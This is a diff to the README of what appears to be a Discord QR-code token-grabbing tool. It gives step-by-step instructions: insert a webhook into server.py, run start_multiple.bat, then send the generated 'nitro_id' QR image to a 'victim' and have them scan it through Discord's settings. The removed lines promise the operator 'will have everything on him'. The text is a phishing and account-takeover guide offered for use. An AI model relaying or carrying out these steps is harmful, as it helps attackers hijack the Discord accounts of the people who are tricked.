@@ -9,10 +9,9 @@
 * Once you have installed python 3.7.9 you must run a cmd in the file and type 
 * python -m pip install -r requirements.txt
 
-Then you open the "server" file and you go to line 232/230 and you put your webhook
-once this is done you can launch the file "start_multiple" and type then you made enter
-then you will have in the "out" folder a file named "nitro_id" etc you sent it to the person and then if he scans it
-you will have everything on him!
+* Open the "server.py" file and you go to line 232/230 and you put your webhook
+* After launch "start_multiple.bat" and type 1 then you made enter
+* After got to "out" folder a file named "nitro_id_XXXXXXXX" then sent the file to the victim and he must scan it with the discord application by going to "settings> scan a qr code"
 
 Credits
 https://youtube.com/c/KASav3348
